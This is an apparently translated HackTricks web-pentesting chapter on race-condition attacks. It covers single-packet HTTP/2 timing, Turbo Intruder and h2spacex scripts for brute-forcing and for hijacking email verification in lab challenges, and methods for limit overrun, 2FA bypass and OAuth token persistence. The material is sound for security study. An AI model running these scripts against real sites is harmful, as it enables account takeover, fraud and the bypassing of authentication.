<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Race Condition</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="race-condition"><a class="header" href="#race-condition">Race Condition</a></h1>
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=race-condition"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
今天获取访问权限：</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=race-condition" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术： <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<p>{% hint style="warning" %}
要深入了解此技术，请查看原始报告 <a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a>
{% endhint %}</p>
<h2 id="增强竞争条件攻击"><a class="header" href="#增强竞争条件攻击">增强竞争条件攻击</a></h2>
<p>利用竞争条件的主要障碍是确保多个请求同时处理，<strong>处理时间差异非常小——理想情况下，少于 1 毫秒</strong>。</p>
<p>在这里，您可以找到一些同步请求的技术：</p>
<h4 id="http2-单包攻击与-http11-最后字节同步"><a class="header" href="#http2-单包攻击与-http11-最后字节同步">HTTP/2 单包攻击与 HTTP/1.1 最后字节同步</a></h4>
<ul>
<li><strong>HTTP/2</strong>：支持通过单个 TCP 连接发送两个请求，减少网络抖动的影响。然而，由于服务器端的变化，两个请求可能不足以实现一致的竞争条件利用。</li>
<li><strong>HTTP/1.1 '最后字节同步'</strong>：允许预发送 20-30 个请求的大部分部分，保留一个小片段，然后一起发送，实现同时到达服务器。</li>
</ul>
<p><strong>最后字节同步的准备</strong>包括：</p>
<ol>
<li>发送头部和主体数据，去掉最后一个字节而不结束流。</li>
<li>在初始发送后暂停 100 毫秒。</li>
<li>禁用 TCP_NODELAY，以利用 Nagle 算法批处理最后的帧。</li>
<li>进行 ping 操作以预热连接。</li>
</ol>
<p>随后发送的保留帧应以单个数据包到达，可以通过 Wireshark 验证。此方法不适用于静态文件，这些文件通常不涉及 RC 攻击。</p>
<h3 id="适应服务器架构"><a class="header" href="#适应服务器架构">适应服务器架构</a></h3>
<p>了解目标的架构至关重要。前端服务器可能以不同的方式路由请求，从而影响时序。通过无关请求进行预热的服务器端连接，可能会使请求时序正常化。</p>
<h4 id="处理基于会话的锁定"><a class="header" href="#处理基于会话的锁定">处理基于会话的锁定</a></h4>
<p>像 PHP 的会话处理程序这样的框架按会话序列化请求，可能会掩盖漏洞。为每个请求使用不同的会话令牌可以规避此问题。</p>
<h4 id="克服速率或资源限制"><a class="header" href="#克服速率或资源限制">克服速率或资源限制</a></h4>
<p>如果连接预热无效，通过大量虚假请求故意触发 Web 服务器的速率或资源限制延迟，可能会通过引发服务器端延迟来促进单包攻击，从而有利于竞争条件。</p>
<h2 id="攻击示例"><a class="header" href="#攻击示例">攻击示例</a></h2>
<ul>
<li><strong>Tubo Intruder - HTTP2 单包攻击 (1 个端点)</strong>：您可以将请求发送到 <strong>Turbo intruder</strong> (<code>Extensions</code> -&gt; <code>Turbo Intruder</code> -&gt; <code>Send to Turbo Intruder</code>)，您可以在请求中更改要暴力破解的值 <strong><code>%s</code></strong>，例如 <code>csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&amp;username=carlos&amp;password=%s</code>，然后从下拉菜单中选择 <strong><code>examples/race-single-packer-attack.py</code></strong>：</li>
</ul>
<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
<p>如果您要 <strong>发送不同的值</strong>，您可以使用这个修改过的代码，它使用剪贴板中的字典：</p>
<pre><code class="language-python">passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
</code></pre>
<p>{% hint style="warning" %}
如果网站不支持 HTTP2（仅支持 HTTP1.1），请使用 <code>Engine.THREADED</code> 或 <code>Engine.BURP</code>，而不是 <code>Engine.BURP2</code>。
{% endhint %}</p>
<ul>
<li><strong>Tubo Intruder - HTTP2 单包攻击（多个端点）</strong>：如果您需要向一个端点发送请求，然后向其他多个端点发送请求以触发 RCE，您可以将 <code>race-single-packet-attack.py</code> 脚本更改为类似：</li>
</ul>
<pre><code class="language-python">def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
</code></pre>
<ul>
<li>它也可以通过 Burp Suite 中新的“<strong>并行发送组</strong>”选项在 <strong>Repeater</strong> 中使用。</li>
<li>对于 <strong>limit-overrun</strong>，您可以在组中<strong>添加相同的请求 50 次</strong>。</li>
<li>对于 <strong>connection warming</strong>，您可以在 <strong>组的开始</strong>添加一些请求到 web 服务器的某个非静态部分。</li>
<li>对于在处理 <strong>一个请求和另一个请求之间</strong>的过程 <strong>延迟</strong>，您可以在两个请求之间 <strong>添加额外的请求</strong>。</li>
<li>对于 <strong>multi-endpoint</strong> RC，您可以开始发送 <strong>请求</strong>，该请求 <strong>进入隐藏状态</strong>，然后在其后 <strong>发送 50 个请求</strong>，这些请求 <strong>利用隐藏状态</strong>。</li>
</ul>
<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
<ul>
<li><strong>自动化 Python 脚本</strong>：该脚本的目标是更改用户的电子邮件，同时不断验证，直到新电子邮件的验证令牌到达最后一个电子邮件（这是因为在代码中看到一个 RC，可以修改电子邮件，但验证被发送到旧电子邮件，因为指示电子邮件的变量已经用第一个填充）。<br />
当在收到的电子邮件中找到“objetivo”这个词时，我们知道收到了更改电子邮件的验证令牌，并结束攻击。</li>
</ul>
<pre><code class="language-python"># https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&amp;username=estes&amp;fullName=test&amp;antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
</code></pre>
<h3 id="改进单包攻击"><a class="header" href="#改进单包攻击">改进单包攻击</a></h3>
<p>在原始研究中解释了此攻击的限制为1,500字节。然而，在<a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/"><strong>这篇文章</strong></a>中，解释了如何通过使用IP层分片（将单个数据包拆分为多个IP数据包）并以不同顺序发送它们，从而扩展单包攻击的1,500字节限制到<strong>65,535 B的TCP窗口限制</strong>，这使得在所有片段到达服务器之前，防止重新组装数据包。这项技术使研究人员能够在大约166毫秒内发送10,000个请求。 </p>
<p>请注意，尽管此改进使得在需要数百/数千个数据包同时到达的RC攻击中更可靠，但它也可能有一些软件限制。一些流行的HTTP服务器如Apache、Nginx和Go将<code>SETTINGS_MAX_CONCURRENT_STREAMS</code>设置为100、128和250。然而，其他如NodeJS和nghttp2则没有限制。<br />
这基本上意味着Apache将只考虑来自单个TCP连接的100个HTTP连接（限制了此RC攻击）。</p>
<p>您可以在仓库<a href="https://github.com/Ry0taK/first-sequence-sync/tree/main">https://github.com/Ry0taK/first-sequence-sync/tree/main</a>中找到使用此技术的一些示例。</p>
<h2 id="原始bf"><a class="header" href="#原始bf">原始BF</a></h2>
<p>在之前的研究之前，使用了一些有效载荷，这些有效载荷只是试图尽可能快地发送数据包以引发RC。</p>
<ul>
<li><strong>Repeater:</strong> 查看上一节中的示例。</li>
<li><strong>Intruder</strong>: 将<strong>请求</strong>发送到<strong>Intruder</strong>，在<strong>选项菜单</strong>中将<strong>线程数</strong>设置为<strong>30</strong>，并选择有效载荷<strong>Null payloads</strong>并生成<strong>30</strong>。</li>
<li><strong>Turbo Intruder</strong></li>
</ul>
<pre><code class="language-python">def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=&lt;session_id_1&gt;','Session=&lt;session_id_2&gt;','Session=&lt;session_id_3&gt;']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
</code></pre>
<ul>
<li><strong>Python - asyncio</strong></li>
</ul>
<pre><code class="language-python">import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
</code></pre>
<h2 id="rc-methodology"><a class="header" href="#rc-methodology"><strong>RC Methodology</strong></a></h2>
<h3 id="limit-overrun--toctou"><a class="header" href="#limit-overrun--toctou">Limit-overrun / TOCTOU</a></h3>
<p>这是最基本的竞争条件类型，其中<strong>漏洞</strong>出现在<strong>限制您执行操作次数</strong>的地方。就像在网络商店中多次使用相同的折扣码。一个非常简单的例子可以在<a href="https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43"><strong>这份报告</strong></a>或<a href="https://hackerone.com/reports/759247"><strong>这个漏洞</strong></a><strong>中找到。</strong></p>
<p>这种攻击有许多变体，包括：</p>
<ul>
<li>多次兑换礼品卡</li>
<li>多次评价产品</li>
<li>提取或转移超过您账户余额的现金</li>
<li>重复使用单个 CAPTCHA 解</li>
<li>绕过反暴力破解速率限制</li>
</ul>
<h3 id="hidden-substates"><a class="header" href="#hidden-substates"><strong>Hidden substates</strong></a></h3>
<p>利用复杂的竞争条件通常涉及利用与隐藏或<strong>意外机器子状态</strong>交互的短暂机会。以下是处理此问题的方法：</p>
<ol>
<li><strong>识别潜在的隐藏子状态</strong></li>
</ol>
<ul>
<li>首先确定修改或与关键数据交互的端点，例如用户资料或密码重置过程。重点关注：</li>
<li><strong>存储</strong>：优先选择操作服务器端持久数据的端点，而不是处理客户端数据的端点。</li>
<li><strong>操作</strong>：寻找更可能创建可利用条件的操作，这些操作会更改现有数据，而不是添加新数据。</li>
<li><strong>键控</strong>：成功的攻击通常涉及基于相同标识符的操作，例如用户名或重置令牌。</li>
</ul>
<ol start="2">
<li><strong>进行初步探测</strong></li>
</ol>
<ul>
<li>使用竞争条件攻击测试识别的端点，观察是否有任何偏离预期结果的情况。意外的响应或应用程序行为的变化可能表明存在漏洞。</li>
</ul>
<ol start="3">
<li><strong>证明漏洞</strong></li>
</ol>
<ul>
<li>将攻击缩小到利用漏洞所需的最少请求数量，通常仅为两个。由于涉及精确的时机，这一步可能需要多次尝试或自动化。</li>
</ul>
<h3 id="时间敏感攻击"><a class="header" href="#时间敏感攻击">时间敏感攻击</a></h3>
<p>请求的时机精确性可以揭示漏洞，特别是当使用可预测的方法（如时间戳）作为安全令牌时。例如，基于时间戳生成密码重置令牌可能允许同时请求相同的令牌。</p>
<p><strong>利用：</strong></p>
<ul>
<li>使用精确的时机，例如单个数据包攻击，发起并发的密码重置请求。相同的令牌表明存在漏洞。</li>
</ul>
<p><strong>示例：</strong></p>
<ul>
<li>同时请求两个密码重置令牌并进行比较。匹配的令牌表明令牌生成存在缺陷。</li>
</ul>
<p><strong>查看这个</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities"><strong>PortSwigger Lab</strong></a> <strong>来尝试这个。</strong></p>
<h2 id="hidden-substates-case-studies"><a class="header" href="#hidden-substates-case-studies">Hidden substates case studies</a></h2>
<h3 id="pay--add-an-item"><a class="header" href="#pay--add-an-item">Pay &amp; add an Item</a></h3>
<p>查看这个 <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation"><strong>PortSwigger Lab</strong></a> 以了解如何在商店中<strong>支付</strong>并<strong>添加一个额外</strong>的您<strong>不需要支付的</strong>物品。</p>
<h3 id="confirm-other-emails"><a class="header" href="#confirm-other-emails">Confirm other emails</a></h3>
<p>这个想法是<strong>同时验证一个电子邮件地址并将其更改为另一个</strong>，以找出平台是否验证了更改的新地址。</p>
<h3 id="change-email-to-2-emails-addresses-cookie-based"><a class="header" href="#change-email-to-2-emails-addresses-cookie-based">Change email to 2 emails addresses Cookie based</a></h3>
<p>根据<a href="https://portswigger.net/research/smashing-the-state-machine"><strong>这项研究</strong></a>，Gitlab 通过这种方式容易受到接管，因为它可能<strong>将一个电子邮件的</strong> <strong>电子邮件验证令牌发送到另一个电子邮件</strong>。</p>
<p><strong>查看这个</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint"><strong>PortSwigger Lab</strong></a> <strong>来尝试这个。</strong></p>
<h3 id="hidden-database-states--confirmation-bypass"><a class="header" href="#hidden-database-states--confirmation-bypass">Hidden Database states / Confirmation Bypass</a></h3>
<p>如果使用<strong>2个不同的写入</strong>来<strong>添加</strong> <strong>信息</strong>到<strong>数据库</strong>中，则在<strong>仅写入第一条数据</strong>的短时间内存在一个小的时间窗口。例如，在创建用户时，<strong>用户名</strong>和<strong>密码</strong>可能会被<strong>写入</strong>，然后<strong>令牌</strong>用于确认新创建的账户被写入。这意味着在短时间内，<strong>确认账户的令牌是空的</strong>。</p>
<p>因此，<strong>注册一个账户并发送多个带有空令牌的请求</strong>（<code>token=</code>或<code>token[]=</code>或任何其他变体）以立即确认账户，可能允许您<strong>确认一个您无法控制电子邮件的账户</strong>。</p>
<p><strong>查看这个</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction"><strong>PortSwigger Lab</strong></a> <strong>来尝试这个。</strong></p>
<h3 id="bypass-2fa"><a class="header" href="#bypass-2fa">Bypass 2FA</a></h3>
<p>以下伪代码容易受到竞争条件的影响，因为在创建会话的非常短的时间内，<strong>2FA未被强制执行</strong>：</p>
<pre><code class="language-python">session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
</code></pre>
<h3 id="oauth2-永久持久性"><a class="header" href="#oauth2-永久持久性">OAuth2 永久持久性</a></h3>
<p>有几个 <a href="https://en.wikipedia.org/wiki/List_of_OAuth_providers"><strong>OAUth 提供者</strong></a>。这些服务允许您创建一个应用程序并验证提供者注册的用户。为此，<strong>客户端</strong>需要<strong>允许您的应用程序</strong>访问其在<strong>OAUth 提供者</strong>中的某些数据。<br />
到这里为止，只是一个常见的使用 google/linkedin/github 等登录的过程，您会看到一个页面提示：“<em>应用程序 &lt;InsertCoolName&gt; 想要访问您的信息，您想允许吗？</em>”</p>
<h4 id="authorization_code-中的竞争条件"><a class="header" href="#authorization_code-中的竞争条件"><code>authorization_code</code> 中的竞争条件</a></h4>
<p><strong>问题</strong>出现在您<strong>接受</strong>后，自动将**<code>authorization_code</code><strong>发送给恶意应用程序。然后，这个</strong>应用程序利用 OAUth 服务提供者中的竞争条件，从您的账户的**<code>authorization_code</code><strong>生成多个 AT/RT</strong>（<em>身份验证令牌/刷新令牌</em>）。基本上，它将利用您已接受该应用程序访问您数据的事实来<strong>创建多个账户</strong>。然后，如果您<strong>停止允许该应用程序访问您的数据，一对 AT/RT 将被删除，但其他的仍然有效</strong>。</p>
<h4 id="refresh-token-中的竞争条件"><a class="header" href="#refresh-token-中的竞争条件"><code>Refresh Token</code> 中的竞争条件</a></h4>
<p>一旦您<strong>获得有效的 RT</strong>，您可以尝试<strong>利用它生成多个 AT/RT</strong>，即使用户取消了恶意应用程序访问其数据的权限，<strong>多个 RT 仍然有效。</strong></p>
<h2 id="websockets-中的-rc"><a class="header" href="#websockets-中的-rc"><strong>WebSockets 中的 RC</strong></a></h2>
<p>在 <a href="https://github.com/redrays-io/WS_RaceCondition_PoC"><strong>WS_RaceCondition_PoC</strong></a> 中，您可以找到一个用 Java 编写的 PoC，以<strong>并行</strong>发送 websocket 消息，利用<strong>Web Sockets 中的竞争条件</strong>。</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://hackerone.com/reports/759247">https://hackerone.com/reports/759247</a></li>
<li><a href="https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html">https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html</a></li>
<li><a href="https://hackerone.com/reports/55140">https://hackerone.com/reports/55140</a></li>
<li><a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a></li>
<li><a href="https://portswigger.net/web-security/race-conditions">https://portswigger.net/web-security/race-conditions</a></li>
<li><a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/">https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=race-condition"><strong>Trickest</strong></a> 轻松构建和<strong>自动化工作流</strong>，由世界上<strong>最先进</strong>的社区工具提供支持。<br />
今天就获取访问权限：</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=race-condition" %}</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/proxy-waf-protections-bypass.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/rate-limit-bypass.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/proxy-waf-protections-bypass.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

